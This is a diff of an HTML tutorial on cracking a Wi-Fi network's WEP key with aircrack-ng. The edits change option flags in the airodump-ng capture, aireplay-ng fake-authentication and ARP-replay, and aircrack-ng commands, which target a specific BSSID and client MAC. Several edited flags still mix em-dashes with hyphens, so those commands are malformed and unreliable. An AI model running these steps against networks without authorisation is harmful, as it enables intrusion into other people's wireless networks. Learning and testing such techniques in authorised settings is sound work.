@@ -57,12 +57,12 @@
         
         So do this in one terminal we have to press<br><br>
         
-        airodump-ng —bssid 64:16:F0:EC:7B:F3 —channel 6 —write arpreplay mon0 <br><br>
+        airodump-ng --bssid 64:16:F0:EC:7B:F3 —-channel 6 —-write arpreplay mon0 <br><br>
         
         Here data is 0 so we need to make fake auth attack<br><br>
         
         In next terminal<br>
-        aireplay-ng —fakeauth 0 -a  64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br>
+        aireplay-ng —-fakeauth 0 -a  64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br>
         Before writing more in this we have to go in another terminal<br><br>
         
         In next terminal<br>
@@ -84,10 +84,10 @@
         4. Keep doing this till we have enough IVs to crack the key<br><br>
         
         To do this we hit this command in terminal<br>
-        aireplay-ng —arpreplay -b 64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br><br>
+        aireplay-ng —-arpreplay -b 64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br><br>
         
         In other terminal press again<br>
-        aireplay-ng —fakeauth 0 -a  64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br><br>
+        aireplay-ng -—fakeauth 0 -a  64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br><br>
         
         We again call<br>
         aircrack-ng  arpreplay-01.cap <br>
